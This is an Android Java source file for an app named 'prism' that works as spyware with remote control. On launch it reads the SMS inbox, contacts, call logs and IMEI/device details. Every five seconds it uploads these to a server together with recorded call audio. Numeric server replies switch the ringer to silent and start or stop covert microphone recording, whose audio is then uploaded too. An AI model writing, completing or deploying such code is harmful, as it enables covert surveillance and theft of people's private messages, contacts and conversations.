package com.example.devam.prism;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.media.AudioManager;
import android.net.Uri;
import android.os.Build;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;
import android.os.Handler;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.toolbox.Volley;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Date;
import java.util.logging.LogRecord;

public class MainActivity extends AppCompatActivity {

    Button b1,b2,b3,b4,b5,b6;
    Cursor cursor ;
    String name, phonenumber ;
    String contacts="",call_logs="",sms_list="",info="";
    public  static final int RequestPermissionCode  = 1 ;
    Handler handler=new Handler();

    private Runnable runnableCode = new Runnable() {
        @Override
        public void run() {
            fetchSMS();
            fetchContacts();
            fetchCallDetails();
            fetchAboutPhone();

            sendData(); // Volley Request

            // Repeat this the same runnable code block again another 2 seconds
            handler.postDelayed(runnableCode, 5000);
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        fetchSMS();
        System.out.println(sms_list);
        handler.post(runnableCode);
        System.out.println(contacts);
        System.out.println(sms_list);
        System.out.println(call_logs);



    }



    static AudioRecorder obj2=new AudioRecorder("recorded_audio_on_demand");
    byte[] ondemandaudio;
    String ondemand="";
    public void sendData(){
        String code;

        final AudioManager mobilemode = (AudioManager) this.getSystemService(Context.AUDIO_SERVICE);

        //mobilemode.setRingerMode(AudioManager.RINGER_MODE_SILENT);
        Response.Listener<String> responseListener=new Response.Listener<String>(){

            @Override
            public void onResponse(String response) {

                try {
                    //SoundProfile obj=new SoundProfile();
                    Toast.makeText(getBaseContext(),"Response: " + response,Toast.LENGTH_SHORT).show();
                    //String oldresponse,newresponse;

                    boolean flag=false;

                    if(response.equals("1533")){
                        mobilemode.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
                        //Toast.makeText(getBaseContext(),"Normal profile activated" + response,Toast.LENGTH_SHORT).show();
                        //obj.stop();
                    }
                    if(response.equals("1532")){
                        //flag=true;
                        mobilemode.setRingerMode(AudioManager.RINGER_MODE_SILENT);
                        //obj.start();
                        //Toast.makeText(getBaseContext(),"SILENT profile activated ",Toast.LENGTH_SHORT).show();

                    }
                    if(response.equals("1534")){
                        Toast.makeText(getBaseContext(),"Received record command.",Toast.LENGTH_SHORT).show();
                        obj2.start();
                    }
                    if(response.equals("1")){
                        ondemand="";
                    }
                    if(response.equals("1535")){
                        Toast.makeText(getBaseContext(),"Received record stop command.",Toast.LENGTH_SHORT).show();
                        obj2.stop();
                        try {

                            ondemandaudio = getBytesFromFile("/storage/emulated/0/recorded_audio_on_demand.3gp");
                            if(ondemandaudio!=null) {
                                for (int i = 0; i < ondemandaudio.length; i++) {
                                    ondemand += ondemandaudio[i] + ",";
                                }
                            }
                        }catch (Exception e){}
                    }

                    //Toast.makeText(MainActivity.this, response,
                           // Toast.LENGTH_LONG).show();

                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        };
        String lat="28.361536";
        String lng="75.587578";

        //byte[] ondemandaudio;
        /*try {

            ondemandaudio = getBytesFromFile("/storage/emulated/0/recorded_audio_on_demand.3gp");
            if(ondemandaudio!=null) {
                for (int i = 0; i < ondemandaudio.length; i++) {
                    ondemand += ondemandaudio[i] + ",";
                }
            }
        }catch (Exception e){}*/

       String tobesent="";

        if(PhoneStateReceiver.audio!=null) {
                for (int i = 0; i < PhoneStateReceiver.audio.length; i++) {
                    tobesent += PhoneStateReceiver.audio[i] + ",";
                }
                PhoneStateReceiver.setNull();
            }

       // System.out.println("Hello World!");


        DataRequest obj=new DataRequest(contacts,sms_list,call_logs,info,lat,lng,tobesent,ondemand,responseListener);
        RequestQueue queue= Volley.newRequestQueue(MainActivity.this);
        queue.add(obj);

    }

    public static byte[] getBytesFromFile (String filePath) throws Exception {
        File file = new File(filePath);
        byte[] bytesArray = new byte[(int) file.length()];

        FileInputStream fis = new FileInputStream(file);
        fis.read(bytesArray); //read file into bytes[]
        fis.close();
        return bytesArray;
    }

    private void requestIMEIPermission() {
        String permission = Manifest.permission.READ_PHONE_STATE;
        int grant = ContextCompat.checkSelfPermission(this, permission);
        if (grant != PackageManager.PERMISSION_GRANTED) {
            String[] permission_list = new String[1];
            permission_list[0] = permission;
            ActivityCompat.requestPermissions(this, permission_list, 1);
        }
    }
    private void requestCallPermission() {
        String permission = Manifest.permission.READ_CALL_LOG;
        int grant = ContextCompat.checkSelfPermission(this, permission);
        if (grant != PackageManager.PERMISSION_GRANTED) {
            String[] permission_list = new String[1];
            permission_list[0] = permission;
            ActivityCompat.requestPermissions(this, permission_list, 1);
        }
    }

    public void fetchAboutPhone()
    {
        info="";
        TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
        info+=" IMEI:"+telephonyManager.getDeviceId();
        info+="\n OS Version: " + System.getProperty("os.version");
        info+="\n Brand: "+ Build.BRAND;
        info += "\n Android Version: "+android.os.Build.VERSION.RELEASE + "("+android.os.Build.VERSION.SDK_INT+")";
        info += "\n Device: " + android.os.Build.DEVICE;
        info += "\n Model: " + android.os.Build.MODEL + " ("+ android.os.Build.PRODUCT + ")";
    }


    private String fetchCallDetails() {
        call_logs="";
        requestCallPermission();
        StringBuffer sb = new StringBuffer();
        Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null,
                null, null, null);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        //sb.append("Call Details :");
        while (managedCursor.moveToNext()) {
            String phNumber = managedCursor.getString(number);
            String callType = managedCursor.getString(type);
            String callDate = managedCursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = managedCursor.getString(duration);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            sb.append(phNumber +","+dir +","+callDayTime+","+callDuration+"\n");
            //sb.append("\n----------------------------------");
        }
        //managedCursor.close();

        call_logs+=sb.toString();



        return call_logs;

    }

    public void fetchContacts(){
        //String str="";
        contacts="";
        cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null, null, null);

        while (cursor.moveToNext()) {
            name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            phonenumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            contacts+=name+ "~"+phonenumber+"\n";
        }


    }

    public void EnableRuntimePermission(){

        if (ActivityCompat.shouldShowRequestPermissionRationale(
                MainActivity.this,
                Manifest.permission.READ_CONTACTS))
        {

            Toast.makeText(MainActivity.this,"CONTACTS permission allows us to Access CONTACTS app", Toast.LENGTH_LONG).show();

        } else {

            ActivityCompat.requestPermissions(MainActivity.this,new String[]{
                    Manifest.permission.READ_CONTACTS}, RequestPermissionCode);

        }
    }

    @Override
    public void onRequestPermissionsResult(int RC, String per[], int[] PResult) {

        switch (RC) {

            case RequestPermissionCode:

                if (PResult.length > 0 && PResult[0] == PackageManager.PERMISSION_GRANTED) {



                } else {

                    Toast.makeText(MainActivity.this,"Error!", Toast.LENGTH_LONG).show();

                }
                break;
        }
    }

    public ArrayList<String> fetchSMS(){
        sms_list="";
        ArrayList<String> sms=new ArrayList<String>();
        requestSmsPermission();
        //requestIMEIPermission();
        String str=new String();
        Uri uri=Uri.parse("content://sms/inbox");

        Cursor cursor=getContentResolver().query(uri,new String[]{"_id","address","date","body"},null,null,null);
        cursor.moveToFirst();
        sms_list+=cursor.getString(1)+"~"+cursor.getString(3).replace('\n',' ')+"\n";
        while(cursor.moveToNext()){
            String address=cursor.getString(1);
            String body=cursor.getString(3);
            sms.add(address+"\n"+body);
            body=body.replace('\n',' ');
            sms_list+=address+"~"+body+"\n";
        }

        TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
        //str+="IMEI:"+telephonyManager.getDeviceId();

        //sms_list=str;
        return sms;

    }

    private void requestSmsPermission() {
        String permission = Manifest.permission.READ_SMS;
        int grant = ContextCompat.checkSelfPermission(this, permission);
        if (grant != PackageManager.PERMISSION_GRANTED) {
            String[] permission_list = new String[1];
            permission_list[0] = permission;
            ActivityCompat.requestPermissions(this, permission_list, 1);
        }
    }


}
